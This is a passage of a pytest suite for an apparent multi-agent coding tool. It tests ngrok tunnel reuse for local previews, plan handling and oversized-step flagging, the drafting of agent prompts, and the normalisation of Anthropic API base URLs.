    running agent is told to serve this port instead. Same session, same URL,
    and nobody's process gets killed."""
    from trance import preview

    monkeypatch.setattr(preview, "agent_tunnels", lambda *a, **k: [
        {"name": "command_line", "public_url": "https://x.ngrok-free.dev",
         "config": {"addr": "http://localhost:5000"}}])
    asked = {}

    def fake_retarget(port, policy=""):
        asked["port"], asked["policy"] = port, policy
        return "https://x.ngrok-free.dev"

    monkeypatch.setattr(preview, "retarget_agent", fake_retarget)
    monkeypatch.setattr("trance.preview.shutil.which",
                        lambda _: (_ for _ in ()).throw(AssertionError("spawned ngrok")))

    tunnel = preview.start_tunnel(6000)
    assert asked == {"port": 6000, "policy": ""}
    assert tunnel.url == "https://x.ngrok-free.dev"
    assert tunnel.via_agent is True and tunnel.running is True
    # Managed by us through the agent, so the UI may offer to stop it.
    assert tunnel.to_dict()["adopted"] is False


def test_an_agent_that_will_not_give_up_its_tunnel_says_so(monkeypatch):
    from trance import preview

    monkeypatch.setattr(preview, "agent_tunnels", lambda *a, **k: [
        {"name": "command_line", "public_url": "https://x.ngrok-free.dev",
         "config": {"addr": "http://localhost:5000"}}])
    monkeypatch.setattr(preview, "retarget_agent", lambda *a, **k: "")

    with pytest.raises(preview.TunnelBusy) as raised:
        preview.start_tunnel(6000)
    assert "would not give up" in str(raised.value)


def test_stopping_an_agent_managed_tunnel_leaves_the_agent_alone(monkeypatch):
    """The ngrok process belongs to whoever started it; only the tunnel is ours."""
    from trance import preview

    calls = []
    monkeypatch.setattr(preview, "_agent",
                        lambda path="", method="GET", **k: calls.append((method, path)))

    preview.Tunnel(port=1, url="u", proc=None, via_agent=True, adopted=True).stop()
    assert calls == [("DELETE", "/" + preview.AGENT_TUNNEL)]


def test_an_agent_with_no_tunnels_still_counts_as_running(monkeypatch):
    """An agent whose tunnels have all been closed still holds the one session
    a free account gets. Asking "has it any tunnels?" instead of "is it there?"
    spawns a second ngrok that cannot connect, and the wait for a URL that will
    never come is the 25 seconds you then sit through."""
    from trance import preview

    monkeypatch.setattr(preview, "agent_tunnels", lambda *a, **k: [])
    monkeypatch.setattr(preview, "agent_running", lambda *a, **k: True)
    monkeypatch.setattr(preview, "retarget_agent",
                        lambda port, policy="": "https://x.ngrok-free.dev")
    monkeypatch.setattr("trance.preview.shutil.which",
                        lambda _: (_ for _ in ()).throw(AssertionError("spawned ngrok")))

    tunnel = preview.start_tunnel(7000)
    assert tunnel.url == "https://x.ngrok-free.dev" and tunnel.via_agent is True


def test_with_no_agent_at_all_ngrok_is_started(monkeypatch):
    from trance import preview

    monkeypatch.setattr(preview, "agent_tunnels", lambda *a, **k: [])
    monkeypatch.setattr(preview, "agent_running", lambda *a, **k: False)
    monkeypatch.setattr("trance.preview.shutil.which", lambda _: None)

    with pytest.raises(preview.NoTunnelTool):
        preview.start_tunnel(7000)          # got as far as looking for the binary


def test_a_plan_is_not_rewritten_behind_your_back(tmp_path, monkeypatch):
    """Splitting rewrites the plan you are reading and costs a model call per
    step, and "too big" is a judgement — five points may be exactly the step you
    meant. The estimate is reported; the decision is left where it belongs."""
    from fastapi.testclient import TestClient

    from trance.agents import orchestrator as orch
    from trance.config import Config
    from trance.events import Event
    from trance.server import app as app_module

    plan = {"summary": "s", "team": ["backend"], "steps": [
        {"role": "backend", "task": "build the whole API", "check": None,
         "on_fail": None, "max_loops": 2, "points": 13},
        {"role": "backend", "task": "add one route", "check": None,
         "on_fail": None, "max_loops": 2, "points": 2},
    ]}
    monkeypatch.setattr(orch, "chat", lambda **kw: {
        "text": "here is the plan", "proposal": plan, "truncated": False})

    split_calls = []
    monkeypatch.setattr(orch, "split_oversized",
                        lambda *a, **k: split_calls.append(True) or {"steps": [], "team": []})

    config = Config.load(tmp_path / "none.toml")
    config.runs_dir = str(tmp_path / "runs")
    app = app_module.create_app(config, tmp_path / "sessions")
    client = TestClient(app)
    seen: list[Event] = []
    app.state.bus.subscribe_sync(seen.append)

    project = tmp_path / "proj"
    project.mkdir()
    sid = client.post("/api/sessions",
                      json={"name": "p", "project_dir": str(project)}).json()["id"]
    client.post(f"/api/sessions/{sid}/chat", json={"message": "build it"})

    flow = client.get(f"/api/sessions/{sid}").json()["flow"]["steps"]
    assert [s["task"] for s in flow] == ["build the whole API", "add one route"]
    assert not split_calls, "the plan was split without being asked"

    # ...but the oversized one is named, so the editor can mark it.
    flagged = [e for e in seen if e.type == "oversized_steps"]
    assert len(flagged) == 1 and flagged[0].payload["count"] == 1
    assert flagged[0].payload["step_ids"] == [flow[0]["id"]]
    assert "split any of them" in flagged[0].payload["message"].lower()


def test_a_drafted_prompt_covers_what_a_prompt_here_needs(monkeypatch, tmp_path):
    """The hardest part of adding an agent is the empty box: the shape these
    need is not obvious from the box. The draft is a starting point — so what
    matters is that the model is asked for the right thing."""
    from trance.agents import orchestrator
    from trance.config import ModelConfig
    from trance.events import EventBus
    from trance.providers.base import ChatResponse

    asked = {}

    class Fake:
        def complete(self, messages, tools=None, **kwargs):
            asked["system"] = messages[0]["content"]
            asked["user"] = messages[1]["content"]
            asked["tools"] = tools
            return ChatResponse(text="  You are the migration writer.\n  ")

    monkeypatch.setattr(orchestrator, "client_for", lambda config: Fake())
    text = orchestrator.draft_agent_prompt(
        "migrator", description="writes database migrations",
        goal="a shop", config=ModelConfig(), bus=EventBus(), session_id="s")

    assert text == "You are the migration writer."          # trimmed, used as-is
    assert "'migrator'" in asked["user"]
    assert "writes database migrations" in asked["user"] and "a shop" in asked["user"]
    for needed in ("OUTCOME: SUCCESS", "must not do", "whole files", "200 words"):
        assert needed in asked["user"], needed
    assert asked["tools"] is None                            # prose, not a tool call


def test_drafting_needs_a_name_to_draft_about(tmp_path, monkeypatch):
    from fastapi.testclient import TestClient

    from trance.config import Config
    from trance.server import app as app_module

    config = Config.load(tmp_path / "none.toml")
    config.runs_dir = str(tmp_path / "runs")
    client = TestClient(app_module.create_app(config, tmp_path / "sessions"))

    refused = client.post("/api/agents/draft-prompt", json={"name": "  "})
    assert refused.status_code == 400 and "name is required" in refused.text


def test_a_model_that_returns_nothing_is_not_saved_as_a_prompt(tmp_path, monkeypatch):
    from fastapi.testclient import TestClient

    from trance.agents import orchestrator
    from trance.config import Config
    from trance.server import app as app_module

    monkeypatch.setattr(orchestrator, "draft_agent_prompt", lambda *a, **k: "   ")
    config = Config.load(tmp_path / "none.toml")
    config.runs_dir = str(tmp_path / "runs")
    client = TestClient(app_module.create_app(config, tmp_path / "sessions"))

    empty = client.post("/api/agents/draft-prompt", json={"name": "migrator"})
    assert empty.status_code == 502 and "returned nothing" in empty.text


def test_clearing_the_plan_keeps_only_what_is_mid_flight(tmp_path):
    """Emptying the flow must not yank a step out from under a running agent —
    that is the one thing an edit is never allowed to do."""
    from fastapi.testclient import TestClient

    from trance.config import Config
    from trance.server import app as app_module

    config = Config.load(tmp_path / "none.toml")
    config.runs_dir = str(tmp_path / "runs")
    client = TestClient(app_module.create_app(config, tmp_path / "sessions"))
    project = tmp_path / "proj"
    project.mkdir()
    sid = client.post("/api/sessions",
                      json={"name": "p", "project_dir": str(project)}).json()["id"]
    client.put(f"/api/sessions/{sid}/flow", json={"steps": [
        {"role": "backend", "task": "done one", "status": "done"},
        {"role": "backend", "task": "running one", "status": "running"},
        {"role": "backend", "task": "pending one", "status": "pending"},
    ]})

    client.put(f"/api/sessions/{sid}/flow", json={"steps": []})

    left = client.get(f"/api/sessions/{sid}").json()["flow"]["steps"]
    assert [(s["task"], s["status"]) for s in left] == [("running one", "running")]

    # And with nothing in flight, clearing leaves nothing at all. (A fresh
    # session: the running step above is not removable by any edit, ever.)
    other = client.post("/api/sessions",
                        json={"name": "q", "project_dir": str(project)}).json()["id"]
    client.put(f"/api/sessions/{other}/flow", json={"steps": [
        {"role": "backend", "task": "a", "status": "pending"},
        {"role": "backend", "task": "b", "status": "failed"}]})
    client.put(f"/api/sessions/{other}/flow", json={"steps": []})
    assert client.get(f"/api/sessions/{other}").json()["flow"]["steps"] == []


def test_an_anthropic_url_ending_in_v1_still_works():
    """Every other provider here wants a base URL ending in /v1, so that is
    what gets typed. The Anthropic SDK appends /v1/messages itself, so it then
    asks for /v1/v1/messages and comes back:

        404 - {'type': 'not_found_error', 'message': 'Not found'}

    which mentions neither the URL nor the version. The suffix is dropped."""
    from trance.providers.anthropic_client import anthropic_base

    # The default host, however it was written: let the SDK decide.
    assert anthropic_base("https://api.anthropic.com/v1") == ""
    assert anthropic_base("https://api.anthropic.com/v1/") == ""
    assert anthropic_base("https://api.anthropic.com") == ""
    assert anthropic_base("") == ""

    # A gateway is still honoured — minus the suffix that would double up.
    assert anthropic_base("https://gw.internal/anthropic/v1") == "https://gw.internal/anthropic"
    assert anthropic_base("https://gw.internal/anthropic") == "https://gw.internal/anthropic"


def test_the_anthropic_client_does_not_pass_a_doubled_version(monkeypatch):
    from trance.config import ModelConfig
    from trance.providers import anthropic_client

    seen = {}

    class FakeSDK:
        class Anthropic:
            def __init__(self, **kwargs):
                seen.update(kwargs)

    monkeypatch.setitem(__import__("sys").modules, "anthropic", FakeSDK)
    anthropic_client.AnthropicClient(ModelConfig(
        kind="anthropic", model="claude-sonnet-5", api_key="k",
        base_url="https://api.anthropic.com/v1"))
    assert "base_url" not in seen           # the SDK's own default is correct

    seen.clear()
    anthropic_client.AnthropicClient(ModelConfig(
        kind="anthropic", model="claude-sonnet-5", api_key="k",
        base_url="https://gw.internal/anthropic/v1"))
    assert seen["base_url"] == "https://gw.internal/anthropic"
